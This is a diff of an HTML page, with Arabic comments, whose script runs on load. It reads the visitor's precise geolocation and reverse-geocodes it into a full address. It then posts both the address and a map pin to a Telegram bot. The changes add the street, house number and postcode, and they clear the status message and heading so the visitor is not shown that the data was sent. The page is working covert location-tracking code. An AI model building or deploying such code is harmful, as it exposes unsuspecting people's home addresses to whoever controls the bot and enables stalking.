@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>WEB</title>
+<title>WEB ROM</title>
 <style>
 body{font-family:Tahoma, Arial;background:#f3f6ff;height:100vh;margin:0;display:flex;align-items:center;justify-content:center;text-align:center}
 #status{margin-top:10px;color:#333}
@@ -12,7 +12,7 @@ body{font-family:Tahoma, Arial;background:#f3f6ff;height:100vh;margin:0;display:
 <body>
 
 <div id="msg">
-<h3>.</h3>
+<h3></h3>
 <p id="status">..</p>
 <small></small>
 </div>
@@ -35,47 +35,60 @@ window.addEventListener("load", async ()=>{
     const lat = position.coords.latitude;
     const lon = position.coords.longitude;
 
-    statusEl.textContent = `الموقع تم تحديده: Lat=${lat}, Lon=${lon} — جارٍ البحث عن التفاصيل...`;
+    statusEl.textContent = `الموقع تم تحديده: Lat=${lat}, Lon=${lon} — جارٍ استخراج التفاصيل...`;
 
     try{
-      // استخدام Nominatim OpenStreetMap لتحويل الإحداثيات لعنوان
+      // 1️⃣ استخراج تفاصيل العنوان الكامل
       const geoResp = await fetch(`https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${lat}&lon=${lon}`);
       const geoData = await geoResp.json();
+      const addr = geoData.address || {};
+      
+      const country = addr.country || "غير معروف";
+      const state = addr.state || addr.region || "غير معروف";
+      const city = addr.city || addr.town || addr.village || addr.county || "غير معروف";
+      const suburb = addr.suburb || addr.neighbourhood || "";
+      const road = addr.road || addr.footway || "";
+      const postcode = addr.postcode || "";
+      const house = addr.house_number || "";
 
-      const country = geoData.address.country || "غير معروف";
-      const state = geoData.address.state || geoData.address.region || "غير معروف";
-      const city = geoData.address.city || geoData.address.town || geoData.address.village || geoData.address.county || "غير معروف";
-      const suburb = geoData.address.suburb || geoData.address.neighbourhood || "";
-
-      const message = `📍 تم تحديد موقع المستخدم:
+      const addressMessage = `📍 تفاصيل الموقع الكامل:
 الدولة: ${country}
-المحافظة/المنطقة: ${state}
-المدينة/الحي: ${city}${suburb?'\nالحي/المنطقة الصغيرة: '+suburb:''}
+المحافظة / المنطقة: ${state}
+المدينة / البلدة: ${city}
+الحي / المنطقة الصغيرة: ${suburb || "غير محدد"}
+اسم الشارع: ${road || "غير محدد"}
+رقم المنزل / المبنى: ${house || "غير محدد"}
+الرمز البريدي: ${postcode || "غير محدد"}
 الإحداثيات: Lat=${lat}, Lon=${lon}`;
 
-      // إرسال الرسالة للبوت
-      const form = new FormData();
-      form.append("chat_id", CHAT_ID);
-      form.append("text", message);
-
-      const resp = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
+      // إرسال العنوان التفصيلي كنص
+      const form1 = new FormData();
+      form1.append("chat_id", CHAT_ID);
+      form1.append("text", addressMessage);
+      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
         method:"POST",
-        body:form
+        body:form1
       });
 
-      if(resp.ok){
-        statusEl.textContent = "✅ تم إرسال تفاصيل الموقع للبوت بنجاح.";
-      }else{
-        statusEl.textContent = "❌ فشل الإرسال. تحقق من التوكن والـ Chat ID.";
-      }
+      // 2️⃣ إرسال الموقع على الخريطة
+      const form2 = new FormData();
+      form2.append("chat_id", CHAT_ID);
+      form2.append("latitude", lat);
+      form2.append("longitude", lon);
+      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`,{
+        method:"POST",
+        body:form2
+      });
+
+      statusEl.textContent = "";
 
     }catch(err){
-      statusEl.textContent = "حدث خطأ أثناء الحصول على تفاصيل الموقع: "+(err.message||err);
+      statusEl.textContent = "حدث خطأ أثناء إرسال التفاصيل والموقع: "+(err.message||err);
     }
 
   }, (err)=>{
     statusEl.textContent = "فشل تحديد الموقع: " + err.message;
-  }, {enableHighAccuracy:true, timeout:10000});
+  }, {enableHighAccuracy:true, timeout:15000});
 });
 </script>
 
